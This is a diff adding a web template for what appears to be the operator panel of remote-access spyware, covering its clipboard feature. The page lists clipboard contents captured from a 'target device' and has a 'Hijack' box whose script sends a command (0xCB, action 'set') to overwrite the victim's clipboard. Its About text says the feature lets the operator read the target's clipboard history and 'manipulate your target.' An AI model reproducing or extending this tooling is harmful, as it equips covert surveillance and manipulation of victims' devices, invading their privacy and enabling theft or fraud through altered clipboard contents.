@@ -1,0 +1,98 @@
+
+<div class="recent-sales box overflow">
+    <div class="title">Clipboard Log</div>
+    <div class="sales-details">
+
+        <ul class="details">
+            <li class="topic">Date</li>
+
+            <% pageData.forEach((notification) => { 
+                    let date = new Date(notification.time);
+                %>
+
+                   <li><a href="#"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %><%= notification.content %></a></li>
+
+                   <% }) %>
+
+</ul>
+
+<ul class="details">
+    <li class="topic">Content</li>
+
+            <% pageData.forEach((notification) => { 
+                    let date = new Date(notification.time);
+                %>
+
+           <li><a href="#"><%= notification.content %></a></li>
+
+        <% }) %>
+
+</ul>
+
+</div>
+
+
+
+<button style="background: rgb(11, 0, 107); color: white; border-style: none; padding: 7px;" onclick="updateButton(this, '0xCB', {'action': 'get'})">Update</button><br> <br> <br>
+
+<div class="field">
+    <h1>Hijack</h1>
+    <textarea placeholder="Text entered here will replace the clipboard of target device!" style="background-color: #2f2f2f !important; padding: 10px; border-style: none; border-radius: 7px; height: 100px; color: white;" id="hijack"></textarea>
+</div>
+<button style="background-color: #2f2f2f !important; width: 60px; padding: 10px; border-style: none; border-radius: 7px; color: white;" class="ui button fluid positive" type="submit" onclick="hijackClipboard(this)">
+    Hijack
+</button>
+
+</div>
+
+
+<div class="top-sales box">
+<div class="title">About</div>
+<ul class="top-sales-details">
+<li>
+<a href="#">
+  <!--<img src="images/sunglasses.jpg" alt="">-->
+  <span class="product">
+    This feature will enable you to read Clipboard history of the target device. (Clipboards enable you to quickly access items you've copied and pasted into your texts, notes, and emails.) You can also write/replace data on the Clipboard of the target device, in order to manipulate your target.</span>
+
+
+</a>
+</li>
+</ul>
+
+<div class="button">
+<a href="#">Learn More</a>
+</div>
+
+</div>
+
+
+
+
+</div>
+
+
+
+
+<script>
+        function hijackClipboard(element) {
+        $(element).addClass('loading')
+        sendCommand('0xCB', {
+            'action': 'set',
+            'text': $('#hijack').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'Hijacked!');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+</script>
